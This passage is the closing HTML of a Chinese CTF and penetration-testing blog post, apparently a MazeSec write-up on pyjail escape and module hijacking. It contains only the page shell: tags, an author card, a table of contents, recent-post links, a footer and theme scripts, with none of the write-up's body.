href="../../../../tags/pyjail/">pyjail</a><a class="post-meta__tags" href="../../../../tags/%E6%A8%A1%E5%9D%97%E5%8A%AB%E6%8C%81/">模块劫持</a></div><div class="post-share"><div class="social-share" data-image="../../../../img/weixin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="../../06/MazeSec-Koishi/" title="MazeSec-Koishi"><!-- 修改部分：无论 cover_type，用统一的背景图片--><div class="cover" style="background-image: url('../../../../img/dog.webp'); background-size: cover; background-position: center;"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">MazeSec-Koishi</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="../../../../img/weixin.jpg" onerror="this.onerror=null;this.src='../../../../img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">BoPo</div><div class="author-info-description">一个热爱网络安全，喜欢渗透测试和CTF的网安小白</div><div class="site-data"><a href="../../../../archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="../../../../tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="../../../../categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Andeli123"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Andeli123" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">web 渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">3.1.</span> <span class="toc-text">重定根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%8A%AB%E6%8C%81"><span class="toc-number">3.2.</span> <span class="toc-text">模块劫持</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../../../2026/03/07/MazeSec-Prison/" title="MazeSec-Prison">MazeSec-Prison</a><time datetime="2026-03-06T16:00:00.000Z" title="发表于 2026-03-07 00:00:00">2026-03-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../../../2026/03/06/MazeSec-Koishi/" title="MazeSec-Koishi">MazeSec-Koishi</a><time datetime="2026-03-05T16:00:00.000Z" title="发表于 2026-03-06 00:00:00">2026-03-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../../../2026/03/03/MazeSec-Key1/" title="MazeSec-Key1">MazeSec-Key1</a><time datetime="2026-03-02T16:00:00.000Z" title="发表于 2026-03-03 00:00:00">2026-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../../../2026/02/18/MazeSec-Twelve/" title="MazeSec-Twelve">MazeSec-Twelve</a><time datetime="2026-02-18T09:15:03.000Z" title="发表于 2026-02-18 17:15:03">2026-02-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../../../2026/02/12/HackTheBox-Facts/" title="HackTheBox-Facts">HackTheBox-Facts</a><time datetime="2026-02-11T16:00:00.000Z" title="发表于 2026-02-12 00:00:00">2026-02-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(../../../../img/woman.webp);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By BoPo</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="../../../../js/utils.js"></script><script src="../../../../js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="../../../../js/search/local-search.js"></script></div></div></body></html>
